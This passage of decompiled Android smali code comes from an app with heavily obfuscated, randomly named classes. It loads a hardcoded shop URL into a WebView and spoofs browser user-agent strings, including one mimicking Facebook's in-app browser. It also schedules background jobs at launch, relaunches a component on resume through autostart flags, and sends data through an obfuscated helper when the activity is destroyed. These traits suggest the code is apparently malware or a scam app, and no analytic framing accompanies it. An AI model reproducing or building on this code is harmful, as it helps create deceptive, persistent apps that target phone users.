    const/4 v3, -0x1

    invoke-virtual {v2, v3}, Landroid/webkit/WebView;->setBackgroundColor(I)V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_4

    goto :goto_e

    :catch_4
    nop

    .line 952
    :goto_e
    iget-object v2, v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v2

    const/4 v3, 0x0

    invoke-virtual {v2, v3}, Landroid/webkit/WebSettings;->setBuiltInZoomControls(Z)V

    const-string v2, "https://app.hkliveshop.shop/"

    .line 959
    iput-object v2, v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->value:Ljava/lang/String;

    const-string v3, "google.com"

    .line 961
    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_2a

    iget-object v2, v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->value:Ljava/lang/String;

    const-string v3, "youtube.com"

    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_29

    goto :goto_f

    .line 969
    :cond_29
    iget-object v2, v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v2

    const-string v3, "Mozilla/5.0 (Linux; Android 11; SM-A125F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/362.0.0.27.109;]"

    invoke-virtual {v2, v3}, Landroid/webkit/WebSettings;->setUserAgentString(Ljava/lang/String;)V

    goto :goto_10

    .line 963
    :cond_2a
    :goto_f
    iget-object v2, v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v2

    const-string v3, "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36"

    invoke-virtual {v2, v3}, Landroid/webkit/WebSettings;->setUserAgentString(Ljava/lang/String;)V

    .line 973
    :goto_10
    iget-object v2, v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mWebView:Landroid/webkit/WebView;

    new-instance v3, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31$8;

    invoke-direct {v3, v0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31$8;-><init>(Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;)V

    invoke-virtual {v2, v3}, Landroid/webkit/WebView;->setDownloadListener(Landroid/webkit/DownloadListener;)V

    .line 1056
    iget-object v2, v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mWebView:Landroid/webkit/WebView;

    new-instance v3, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31$MyChrome;

    invoke-direct {v3, v0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31$MyChrome;-><init>(Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;)V

    invoke-virtual {v2, v3}, Landroid/webkit/WebView;->setWebChromeClient(Landroid/webkit/WebChromeClient;)V

    .line 1057
    iget-object v2, v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mWebView:Landroid/webkit/WebView;

    new-instance v3, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31$MyWebViewClient;

    invoke-direct {v3, v0, v1}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31$MyWebViewClient;-><init>(Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31$1;)V

    invoke-virtual {v2, v3}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    .line 1091
    iget-object v1, v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mWebView:Landroid/webkit/WebView;

    iget-object v2, v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->value:Ljava/lang/String;

    invoke-virtual {v1, v2}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    .line 1107
    invoke-virtual/range {p0 .. p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v1}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->scheduleJob(Landroid/content/Context;)V

    :goto_11
    return-void
.end method

.method protected onDestroy()V
    .locals 2

    .line 1187
    sget-boolean v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/asutbmomaeefxtlqfuytwyqiqwcjwovgvxuzzeksuyivrgnhwe38;->echo:Z

    if-eqz v0, :cond_0

    .line 1190
    sget-object v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/bghpkflbsrdsvseabfrvhaqeqknyboiznnnuhmgjgwuhcnhlux9;->AA:Ljava/lang/String;

    const-string v1, " "

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    invoke-static {v0, v1}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/asutbmomaeefxtlqfuytwyqiqwcjwovgvxuzzeksuyivrgnhwe38;->ppjqypegmusvyoukqvwfhmfvidrprjwgzabmmayvgnppcpjada52(Ljava/lang/String;[B)V

    .line 1192
    :cond_0
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method

.method protected onRestoreInstanceState(Landroid/os/Bundle;)V
    .locals 1

    .line 123
    invoke-super {p0, p1}, Landroid/app/Activity;->onRestoreInstanceState(Landroid/os/Bundle;)V

    .line 124
    iget-object v0, p0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mWebView:Landroid/webkit/WebView;

    if-eqz v0, :cond_0

    .line 126
    invoke-virtual {v0, p1}, Landroid/webkit/WebView;->restoreState(Landroid/os/Bundle;)Landroid/webkit/WebBackForwardList;

    :cond_0
    return-void
.end method

.method protected onResume()V
    .locals 3

    .line 610
    invoke-super {p0}, Landroid/app/Activity;->onResume()V

    .line 611
    sget-boolean v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->forautostart:Z

    if-eqz v0, :cond_0

    const/4 v0, 0x0

    .line 612
    sput-boolean v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->forautostart:Z

    .line 613
    invoke-virtual {p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sget-object v1, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/hbhfyjepgtgabbcgywepuswwtltbxigielmkedchzdkefwkfql12_MySettings;->Cantgo:Ljava/lang/String;

    const/4 v2, 0x1

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/hbhfyjepgtgabbcgywepuswwtltbxigielmkedchzdkefwkfql12_MySettings;->readBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 616
    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v1, 0x10000000

    .line 617
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 618
    invoke-virtual {p0, v0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->startActivity(Landroid/content/Intent;)V

    .line 620
    invoke-virtual {p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->finish()V

    :cond_0
    return-void
.end method

.method protected onSaveInstanceState(Landroid/os/Bundle;)V
    .locals 1

    .line 113
    invoke-super {p0, p1}, Landroid/app/Activity;->onSaveInstanceState(Landroid/os/Bundle;)V

    .line 114
    iget-object v0, p0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mWebView:Landroid/webkit/WebView;

    if-eqz v0, :cond_0

    .line 116
    invoke-virtual {v0, p1}, Landroid/webkit/WebView;->saveState(Landroid/os/Bundle;)Landroid/webkit/WebBackForwardList;

    :cond_0
    return-void
.end method
